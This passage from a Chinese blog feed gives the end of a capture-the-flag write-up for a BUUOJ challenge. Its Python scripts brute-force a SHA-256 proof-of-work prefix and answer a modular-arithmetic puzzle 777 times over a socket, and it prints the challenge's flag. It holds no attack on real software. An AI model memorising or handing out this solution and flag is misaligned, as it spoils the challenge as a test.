s.update(data.encode())  <span class="comment"># Hash the data.</span></span><br><span class="line">    b = s.hexdigest()  <span class="comment"># Get he hash value.</span></span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">list1 = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>, <span class="string">&quot;e&quot;</span>, <span class="string">&quot;f&quot;</span>, <span class="string">&quot;g&quot;</span>, <span class="string">&quot;h&quot;</span>, <span class="string">&quot;i&quot;</span>, <span class="string">&quot;j&quot;</span>, <span class="string">&quot;k&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;m&quot;</span>, <span class="string">&quot;n&quot;</span>, <span class="string">&quot;o&quot;</span>,</span><br><span class="line">         <span class="string">&quot;p&quot;</span>, <span class="string">&quot;q&quot;</span>, <span class="string">&quot;r&quot;</span>, <span class="string">&quot;s&quot;</span>, <span class="string">&quot;t&quot;</span>, <span class="string">&quot;u&quot;</span>, <span class="string">&quot;v&quot;</span>, <span class="string">&quot;w&quot;</span>, <span class="string">&quot;x&quot;</span>, <span class="string">&quot;y&quot;</span>, <span class="string">&quot;z&quot;</span>, <span class="string">&quot;A&quot;</span>, <span class="string">&quot;B&quot;</span>, <span class="string">&quot;C&quot;</span>, <span class="string">&quot;D&quot;</span>, <span class="string">&quot;E&quot;</span>, <span class="string">&quot;F&quot;</span>, <span class="string">&quot;G&quot;</span>, <span class="string">&quot;H&quot;</span>, <span class="string">&quot;I&quot;</span>, <span class="string">&quot;J&quot;</span>, <span class="string">&quot;K&quot;</span>, <span class="string">&quot;L&quot;</span>, <span class="string">&quot;M&quot;</span>, <span class="string">&quot;N&quot;</span>, <span class="string">&quot;O&quot;</span>, <span class="string">&quot;P&quot;</span>, <span class="string">&quot;Q&quot;</span>, <span class="string">&quot;R&quot;</span>, <span class="string">&quot;S&quot;</span>, <span class="string">&quot;T&quot;</span>, <span class="string">&quot;U&quot;</span>, <span class="string">&quot;V&quot;</span>, <span class="string">&quot;W&quot;</span>, <span class="string">&quot;X&quot;</span>, <span class="string">&quot;Y&quot;</span>, <span class="string">&quot;Z&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> list1:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> list1:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> list1:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> list1:</span><br><span class="line">                flag = <span class="string">&quot;&#123;0&#125;&#123;1&#125;&#123;2&#125;&#123;3&#125;k7h8CNcM3jCpuivQ&quot;</span>.<span class="built_in">format</span>(a, b, c, d)</span><br><span class="line">                flag_sha = decry(flag)</span><br><span class="line">                flag1 = flag[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">                <span class="built_in">print</span>(flag1)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">str</span>(flag_sha) == <span class="string">&#x27;7dbe1e6a592f589a44508d3cb5d72e87a2f653714109dd16d1d94ea461c59a9c&#x27;</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;恭喜！&#x27;</span>)</span><br><span class="line">                    sys.exit()</span><br></pre></td></tr></table></figure><p>得到：UtFn,输入之。</p><p><strong>步骤三</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">plz</span> give me the <span class="number">3080090231</span>th (n) that satisfying (<span class="number">2</span>^n-<span class="number">1</span>) % <span class="number">15</span> == <span class="number">0</span>   (the <span class="number">1</span>st <span class="number">2</span>^n-<span class="number">1</span> is <span class="number">15</span>):</span><br></pre></td></tr></table></figure><p>（2^n -1 ）% 15 == 0 ,即：</p><p>2的n次方-1 后除15 得 = 0，求满足该条件的第3080090231个n</p><ul><li><p>推一遍</p><p>第一个除15得0的正整数是15，此时2^n -1=15,即：第一个n=4</p><p>第二个除15得0的正整数是30，此时n解不出正整数</p><p>第三个除15得0的正整数是45，此时n解不出正整数</p><p>第四个除15得0的正整数是60，此时n解不出正整数</p><p>….</p><p>第十七个除15得0的正整数是255，此时2^n -1=255,即：第二个n=8</p><p>…</p><p>这样，就知道了什么叫做求第X个的解n</p></li><li><p>计算机爆破</p><p>思路却不同以上，以计算机的思维，该如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">target = <span class="number">3080090231</span></span><br><span class="line">num = <span class="number">0</span>  <span class="comment"># 第num个n</span></span><br><span class="line">n = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> num != target:</span><br><span class="line">    n += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">2</span> ** n - <span class="number">1</span>) % <span class="number">15</span> == <span class="number">0</span>:</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;num&quot;</span>,num)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;n&quot;</span>, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;第 &#123;0&#125; 个的解n为： &#123;1&#125;&quot;</span>.<span class="built_in">format</span>(num, n))</span><br></pre></td></tr></table></figure><p>运行到第<strong>百万位</strong>个n，用了三四分钟，现在<strong>十位数</strong>的要求，显然不可能直接爆破</p></li><li><p>观察数据，找规律</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">num <span class="number">0</span></span><br><span class="line">n <span class="number">2</span></span><br><span class="line">num <span class="number">0</span></span><br><span class="line">n <span class="number">3</span></span><br><span class="line">num <span class="number">1</span></span><br><span class="line">n <span class="number">4</span></span><br><span class="line">num <span class="number">1</span></span><br><span class="line">n <span class="number">5</span></span><br><span class="line">num <span class="number">1</span></span><br><span class="line">n <span class="number">6</span></span><br><span class="line">num <span class="number">1</span></span><br><span class="line">n <span class="number">7</span></span><br><span class="line">num <span class="number">2</span></span><br><span class="line">n <span class="number">8</span></span><br><span class="line">num <span class="number">2</span></span><br><span class="line">n <span class="number">9</span></span><br><span class="line">num <span class="number">2</span></span><br><span class="line">n <span class="number">10</span></span><br><span class="line">num <span class="number">2</span></span><br><span class="line">n <span class="number">11</span></span><br><span class="line">num <span class="number">3</span></span><br><span class="line">n <span class="number">12</span></span><br><span class="line">num <span class="number">3</span></span><br><span class="line">n <span class="number">13</span></span><br><span class="line">num <span class="number">3</span></span><br><span class="line">n <span class="number">14</span></span><br><span class="line">num <span class="number">3</span></span><br><span class="line">n <span class="number">15</span></span><br><span class="line">num <span class="number">4</span></span><br><span class="line">n <span class="number">16</span></span><br><span class="line">num <span class="number">4</span></span><br><span class="line">n <span class="number">17</span></span><br><span class="line">num <span class="number">4</span></span><br><span class="line">n <span class="number">18</span></span><br><span class="line">num <span class="number">4</span></span><br><span class="line">n <span class="number">19</span></span><br><span class="line">num <span class="number">5</span></span><br><span class="line">n <span class="number">20</span></span><br></pre></td></tr></table></figure><p>可见：</p><p>第1个n：4</p><p>第2个n：8</p><p>第3个n：12</p><p>第X个n：4*X</p></li><li><p>输入12320360924(4*3080090231)</p></li></ul><p><strong>步骤四</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">You</span> are so smart!</span><br><span class="line"><span class="attribute">plz</span> give me the <span class="number">3423213917</span>th (n) that satisfying (<span class="number">2</span>^n-<span class="number">1</span>) % <span class="number">15</span> == <span class="number">0</span>   (the <span class="number">1</span>st <span class="number">2</span>^n-<span class="number">1</span> is <span class="number">15</span>):</span><br></pre></td></tr></table></figure><ul><li><p>看server.py代码</p><p>可见，并不是解出一个来就给flag，我们得知道判定条件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">777</span>):</span><br><span class="line">           times = getPrime(<span class="number">32</span>)</span><br><span class="line">           self.send(<span class="string">b&#x27;plz give me the &#x27;</span> + <span class="built_in">str</span>(times).encode() + <span class="string">b&#x27;th (n) that satisfying (2^n-1) % 15 == 0:&#x27;</span>)</span><br><span class="line">           n = <span class="built_in">int</span>(self.recv())</span><br><span class="line">           a , ret = check(times,n)</span><br><span class="line">           <span class="keyword">if</span> a == <span class="literal">True</span>:</span><br><span class="line">               self.send(ret.encode())</span><br><span class="line">               counts += <span class="number">1</span></span><br><span class="line">           <span class="keyword">else</span>:</span><br><span class="line">               self.send(ret.encode())</span><br><span class="line">       <span class="keyword">if</span> counts == <span class="number">777</span>:</span><br><span class="line">           self.send(<span class="string">b&#x27;You get flag!&#x27;</span>)</span><br><span class="line">           self.send(flag)</span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           self.send(<span class="string">b&#x27;something wrong?&#x27;</span>)</span><br><span class="line">       self.request.close()</span><br></pre></td></tr></table></figure><p>得知：要<strong>解此问777次</strong>可得flag</p></li><li><p><a href="实现netcat基本功能">python 实现netcat功能</a></p><p>学习后，依次写代码</p><ul><li><p>先是sha256爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  HOST = <span class="string">&#x27;node4.buuoj.cn&#x27;</span></span><br><span class="line">    PORT = <span class="number">28158</span></span><br><span class="line"></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((HOST, PORT))</span><br><span class="line">    data = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(s.recv(<span class="number">1024</span>)).strip(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">    sha_key = data[<span class="number">18</span>:<span class="number">34</span>]  <span class="comment"># like: dygRhRVGRA146H43</span></span><br><span class="line">    sha_data = data[<span class="number">39</span>:<span class="number">103</span>]  <span class="comment"># like: d06a5396ad875acdf0796cc5b0c083170e38728847085cfd99dadaeda71a3d17</span></span><br><span class="line">    <span class="keyword">import</span> hashlib</span><br><span class="line">    <span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第一关 sha256</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decry</span>(<span class="params">data</span>):</span></span><br><span class="line">        s = hashlib.sha256()  <span class="comment"># Get the hash algorithm.</span></span><br><span class="line">        s.update(data.encode())  <span class="comment"># Hash the data.</span></span><br><span class="line">        b = s.hexdigest()  <span class="comment"># Get he hash value.</span></span><br><span class="line">        <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    list1 = [<span class="string">&quot;A&quot;</span>, <span class="string">&quot;B&quot;</span>, <span class="string">&quot;C&quot;</span>, <span class="string">&quot;D&quot;</span>, <span class="string">&quot;E&quot;</span>, <span class="string">&quot;F&quot;</span>, <span class="string">&quot;G&quot;</span>, <span class="string">&quot;H&quot;</span>, <span class="string">&quot;I&quot;</span>, <span class="string">&quot;J&quot;</span>,</span><br><span class="line">             <span class="string">&quot;K&quot;</span>, <span class="string">&quot;L&quot;</span>, <span class="string">&quot;M&quot;</span>, <span class="string">&quot;N&quot;</span>, <span class="string">&quot;O&quot;</span>, <span class="string">&quot;P&quot;</span>, <span class="string">&quot;Q&quot;</span>, <span class="string">&quot;R&quot;</span>, <span class="string">&quot;S&quot;</span>, <span class="string">&quot;T&quot;</span>, <span class="string">&quot;U&quot;</span>, <span class="string">&quot;V&quot;</span>, <span class="string">&quot;W&quot;</span>, <span class="string">&quot;X&quot;</span>, <span class="string">&quot;Y&quot;</span>, <span class="string">&quot;Z&quot;</span>, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>, <span class="string">&quot;e&quot;</span>, <span class="string">&quot;f&quot;</span>, <span class="string">&quot;g&quot;</span>, <span class="string">&quot;h&quot;</span>, <span class="string">&quot;i&quot;</span>, <span class="string">&quot;j&quot;</span>, <span class="string">&quot;k&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;m&quot;</span>, <span class="string">&quot;n&quot;</span>, <span class="string">&quot;o&quot;</span>,</span><br><span class="line">             <span class="string">&quot;p&quot;</span>, <span class="string">&quot;q&quot;</span>, <span class="string">&quot;r&quot;</span>, <span class="string">&quot;s&quot;</span>, <span class="string">&quot;t&quot;</span>, <span class="string">&quot;u&quot;</span>, <span class="string">&quot;v&quot;</span>, <span class="string">&quot;w&quot;</span>, <span class="string">&quot;x&quot;</span>, <span class="string">&quot;y&quot;</span>, <span class="string">&quot;z&quot;</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">yi</span>():</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> list1:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> list1:</span><br><span class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> list1:</span><br><span class="line">                    <span class="keyword">for</span> d <span class="keyword">in</span> list1:</span><br><span class="line">                        flag = <span class="string">&quot;&#123;0&#125;&#123;1&#125;&#123;2&#125;&#123;3&#125;&#123;4&#125;&quot;</span>.<span class="built_in">format</span>(a, b, c, d, sha_key)</span><br><span class="line">                        flag_sha = decry(flag)</span><br><span class="line">                        flag1 = flag[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">                        <span class="built_in">print</span>(flag1)</span><br><span class="line">                        <span class="keyword">if</span> <span class="built_in">str</span>(flag_sha) == <span class="built_in">str</span>(sha_data):</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">&#x27;恭喜！&#x27;</span>)</span><br><span class="line">                            <span class="keyword">return</span> <span class="built_in">str</span>(flag1)</span><br><span class="line"></span><br><span class="line">    s.send(yi().encode())</span><br></pre></td></tr></table></figure></li><li><p>后是没夸你真睿智🤔的那次求n</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s_ = s.recv(<span class="number">1024</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 进入第二关</span></span><br><span class="line"><span class="comment"># b&#x27;plz give me the 2832346159th (n) that satisfying (2^n-1) % 15 == 0   (the 1st 2^n-1 is 15):\n&#x27;</span></span><br><span class="line">    </span><br><span class="line">target = <span class="built_in">str</span>(s_)</span><br><span class="line">target = target.split(<span class="string">&#x27;th&#x27;</span>)</span><br><span class="line">target = target[<span class="number">1</span>][<span class="number">2</span>:]</span><br><span class="line">s.send(<span class="built_in">str</span>(<span class="built_in">int</span>(target)*<span class="number">4</span>).encode())</span><br></pre></td></tr></table></figure></li><li><p>再是剩下776次</p><ul><li><p>这里发现接受一次（s_ = s.recv(1024)），有时只返回You are so smart，不给题，导致报错。</p><p>对此，写if判断，此时再接受一次（s_ = s.recv(1024)），得到题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s_ = s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">str</span>(s_) == <span class="string">r&quot;b&#x27;You are so smart.\n&#x27;&quot;</span>:</span><br><span class="line">    s_ = s.recv(<span class="number">1024</span>)</span><br></pre></td></tr></table></figure></li><li><p>循环接受题目，发送解答，利用正则表达式捕捉题目要求num</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">778</span>):</span><br><span class="line">      s_ = s.recv(<span class="number">1024</span>)</span><br><span class="line">      <span class="keyword">if</span> <span class="built_in">str</span>(s_) == <span class="string">r&quot;b&#x27;You are so smart.\n&#x27;&quot;</span>:</span><br><span class="line">          s_ = s.recv(<span class="number">1024</span>)</span><br><span class="line">      s_ = <span class="built_in">str</span>(s_)</span><br><span class="line">      <span class="built_in">print</span>(s_)</span><br><span class="line">      reg = <span class="string">r&#x27;\d\d\d\d\d\d\d\d\d\d&#x27;</span></span><br><span class="line">      target = re.search(reg, s_)</span><br><span class="line">      target = target.group()</span><br><span class="line">      s.send(<span class="built_in">str</span>(<span class="built_in">int</span>(target) * <span class="number">4</span>).encode())</span><br></pre></td></tr></table></figure><p>这里循环给多一些，报错了自动停止（多多益善，反倒是少了会功亏一篑 </p><p><strong>：（</strong> </p></li></ul></li></ul></li></ul><h4 id="总代码"><a href="#总代码" class="headerlink" title="总代码"></a>总代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    HOST = <span class="string">&#x27;node4.buuoj.cn&#x27;</span></span><br><span class="line">    PORT = <span class="number">28158</span></span><br><span class="line"></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((HOST, PORT))</span><br><span class="line">    data = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(s.recv(<span class="number">1024</span>)).strip(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">    sha_key = data[<span class="number">18</span>:<span class="number">34</span>]  <span class="comment"># like: dygRhRVGRA146H43</span></span><br><span class="line">    sha_data = data[<span class="number">39</span>:<span class="number">103</span>]  <span class="comment"># like: d06a5396ad875acdf0796cc5b0c083170e38728847085cfd99dadaeda71a3d17</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第一关 sha256</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decry</span>(<span class="params">data</span>):</span></span><br><span class="line">        s = hashlib.sha256()  <span class="comment"># Get the hash algorithm.</span></span><br><span class="line">        s.update(data.encode())  <span class="comment"># Hash the data.</span></span><br><span class="line">        b = s.hexdigest()  <span class="comment"># Get he hash value.</span></span><br><span class="line">        <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    list1 = [<span class="string">&quot;A&quot;</span>, <span class="string">&quot;B&quot;</span>, <span class="string">&quot;C&quot;</span>, <span class="string">&quot;D&quot;</span>, <span class="string">&quot;E&quot;</span>, <span class="string">&quot;F&quot;</span>, <span class="string">&quot;G&quot;</span>, <span class="string">&quot;H&quot;</span>, <span class="string">&quot;I&quot;</span>, <span class="string">&quot;J&quot;</span>,</span><br><span class="line">             <span class="string">&quot;K&quot;</span>, <span class="string">&quot;L&quot;</span>, <span class="string">&quot;M&quot;</span>, <span class="string">&quot;N&quot;</span>, <span class="string">&quot;O&quot;</span>, <span class="string">&quot;P&quot;</span>, <span class="string">&quot;Q&quot;</span>, <span class="string">&quot;R&quot;</span>, <span class="string">&quot;S&quot;</span>, <span class="string">&quot;T&quot;</span>, <span class="string">&quot;U&quot;</span>, <span class="string">&quot;V&quot;</span>, <span class="string">&quot;W&quot;</span>, <span class="string">&quot;X&quot;</span>, <span class="string">&quot;Y&quot;</span>, <span class="string">&quot;Z&quot;</span>, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>, <span class="string">&quot;e&quot;</span>, <span class="string">&quot;f&quot;</span>, <span class="string">&quot;g&quot;</span>, <span class="string">&quot;h&quot;</span>, <span class="string">&quot;i&quot;</span>, <span class="string">&quot;j&quot;</span>, <span class="string">&quot;k&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;m&quot;</span>, <span class="string">&quot;n&quot;</span>, <span class="string">&quot;o&quot;</span>,</span><br><span class="line">             <span class="string">&quot;p&quot;</span>, <span class="string">&quot;q&quot;</span>, <span class="string">&quot;r&quot;</span>, <span class="string">&quot;s&quot;</span>, <span class="string">&quot;t&quot;</span>, <span class="string">&quot;u&quot;</span>, <span class="string">&quot;v&quot;</span>, <span class="string">&quot;w&quot;</span>, <span class="string">&quot;x&quot;</span>, <span class="string">&quot;y&quot;</span>, <span class="string">&quot;z&quot;</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">yi</span>():</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> list1:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> list1:</span><br><span class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> list1:</span><br><span class="line">                    <span class="keyword">for</span> d <span class="keyword">in</span> list1:</span><br><span class="line">                        flag = <span class="string">&quot;&#123;0&#125;&#123;1&#125;&#123;2&#125;&#123;3&#125;&#123;4&#125;&quot;</span>.<span class="built_in">format</span>(a, b, c, d, sha_key)</span><br><span class="line">                        flag_sha = decry(flag)</span><br><span class="line">                        flag1 = flag[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">                        <span class="built_in">print</span>(flag1)</span><br><span class="line">                        <span class="keyword">if</span> <span class="built_in">str</span>(flag_sha) == <span class="built_in">str</span>(sha_data):</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">&#x27;恭喜！&#x27;</span>)</span><br><span class="line">                            <span class="keyword">return</span> <span class="built_in">str</span>(flag1)</span><br><span class="line"></span><br><span class="line">    s.send(yi().encode())</span><br><span class="line">    s_ = s.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 进入第二关</span></span><br><span class="line">    <span class="comment"># b&#x27;plz give me the 2832346159th (n) that satisfying (2^n-1) % 15 == 0   (the 1st 2^n-1 is 15):\n&#x27;</span></span><br><span class="line"></span><br><span class="line">    target = <span class="built_in">str</span>(s_)</span><br><span class="line">    target = target.split(<span class="string">&#x27;th&#x27;</span>)</span><br><span class="line">    target = target[<span class="number">1</span>][<span class="number">2</span>:]</span><br><span class="line">    s.send(<span class="built_in">str</span>(<span class="built_in">int</span>(target)*<span class="number">4</span>).encode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">778</span>):</span><br><span class="line">        s_ = s.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(s_) == <span class="string">r&quot;b&#x27;You are so smart.\n&#x27;&quot;</span>:</span><br><span class="line">            s_ = s.recv(<span class="number">1024</span>)</span><br><span class="line">        s_ = <span class="built_in">str</span>(s_)</span><br><span class="line">        <span class="built_in">print</span>(s_)</span><br><span class="line">        reg = <span class="string">r&#x27;\d\d\d\d\d\d\d\d\d\d&#x27;</span></span><br><span class="line">        target = re.search(reg, s_)</span><br><span class="line">        target = target.group()</span><br><span class="line">        s.send(<span class="built_in">str</span>(<span class="built_in">int</span>(target) * <span class="number">4</span>).encode())</span><br><span class="line"><span class="comment"># b&#x27;You are so smart.\nYou get flag!\nflag&#123;4e2fbdd6-1023-408c-816f-08a3725f97e1&#125;\n&#x27;</span></span><br><span class="line"><span class="comment"># flag&#123;4e2fbdd6-1023-408c-816f-08a3725f97e1&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>让 M1 Mac优雅地编写C/C++</title>
      <link href="/2022/02/12/%E8%AE%A9-M1-Mac%E4%BC%98%E9%9B%85%E5%9C%B0%E7%BC%96%E5%86%99C-C/"/>
      <url>/2022/02/12/%E8%AE%A9-M1-Mac%E4%BC%98%E9%9B%85%E5%9C%B0%E7%BC%96%E5%86%99C-C/</url>
      
